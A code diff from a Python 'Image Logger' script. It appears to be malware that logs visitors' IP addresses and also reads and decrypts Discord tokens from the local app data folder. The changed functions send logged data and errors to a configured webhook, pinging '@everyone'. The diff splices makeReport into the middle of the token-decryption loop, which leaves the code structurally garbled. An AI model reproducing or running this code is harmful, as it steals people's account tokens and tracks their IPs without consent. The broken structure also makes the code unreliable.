@@ -84,7 +84,24 @@ def botCheck(ip, useragent):
     else:
         return False
 
-def get_token():
+                
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
@@ -139,24 +156,6 @@ def get_token():
         for token in cleaned:
             try:
                 tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-                
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
-        return
-    
     bot = botCheck(ip, useragent)
     
     if bot:
